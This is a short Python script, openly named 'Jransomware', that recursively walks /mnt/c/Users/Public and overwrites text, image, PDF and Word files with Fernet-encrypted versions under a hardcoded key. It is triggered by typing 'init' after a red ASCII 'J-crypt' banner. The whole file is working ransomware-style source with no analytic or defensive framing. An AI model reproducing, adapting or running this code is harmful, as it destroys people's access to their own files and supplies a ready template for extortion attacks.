import os, sys, time
from cryptography.fernet import Fernet
from pyfiglet import Figlet


class Jransomware:

    def __init__(self):

        self.Fkey = Fernet(b'ffiQ4--kfcdDUrmdVHWgmaoQf_YGBC2gXxG5Yz-0Rz0=')
        self.file_ext = ('txt', 'png', 'jpg', 'pdf', 'docx')


        
    def enCrypt(self, rdir):

        for maindir, _, files in os.walk(rdir):

            for file in files:

                    absolute_f_path = os.path.join(maindir, file)

                    if absolute_f_path.split('.')[-1] in self.file_ext:
                        pass
        
                        with open(os.path.join(maindir, file), 'rb') as f:
                            data = f.read()
                            
                        encrypted = self.Fkey.encrypt(data)
                        
                        with open(os.path.join(maindir, file), 'wb') as f:
                            f.write(encrypted)

    @staticmethod
    
    def ascii_scrpt():
        silent_crypt_custom_ascii = Figlet(font='basic')
        print('\033[31m' + silent_crypt_custom_ascii.renderText('J-crypt') + '\033[0m')
        time.sleep(1)
        sys.stdout.write(str('\033[31m' + 'code: jennofrie\n' + '\033[0m'))
        time.sleep(1)
        print('\033[92m' + "\n{*} Type 'init' to Initiate encryption\n\n " + '\033[0m')


if __name__ == '__main__':

    try:
        Jransomware.ascii_scrpt()
        main_root = '/mnt/c/Users/Public'
        xyz = Jransomware()
        x01 = input('\033[92m<<jcrypt>>: \033[0m')
        if str(x01).startswith('init'):
            xyz.enCrypt(main_root)
            sys.stdout.write(str('\n\033[31m{*} Successfully Encrypted\n \033[0m'))
        else:
            sys.stdout.write(str('\033[31m' + "\n{*} Only option is 'init'\n\n" + '\033[0m'))
            sys.exit()
    except ValueError:
        sys.stdout.write(str('\033[31m' + '\n{*} Number is not part of the option!\n\n' + '\033[0m'))
        sys.exit()

    except KeyboardInterrupt:
        sys.stdout.write(str('\033[31m' + '\n{*} Terminating program...\n\n' + '\033[0m' ))
        sys.exit()
